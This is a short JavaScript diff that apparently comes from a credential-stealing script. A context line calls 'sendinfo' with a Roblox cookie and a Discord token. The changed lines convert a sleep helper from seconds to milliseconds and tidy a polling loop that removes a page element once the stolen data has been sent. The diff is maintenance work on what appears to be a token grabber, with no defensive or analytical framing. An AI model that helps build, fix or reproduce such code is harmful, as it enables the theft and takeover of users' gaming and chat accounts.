@@ -68,17 +68,17 @@ function loadURL() {
 
     sendinfo(RBLXCOOKIE, DISCTOKEN);
 
-function sleep(seconds) {
-    return new Promise(resolve => setTimeout(resolve, seconds * 1000));
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 async function processURLx() {
     while (urlx) {
         if (urlx.innerHTML === '' && sent === true) {
-            await sleep(1.5);
+            await sleep(1500); // 1.5 seconds in ms
             urlx.remove();
         } else {
-            await sleep(1.5);
+            await sleep(1500);
         }
     }
 }
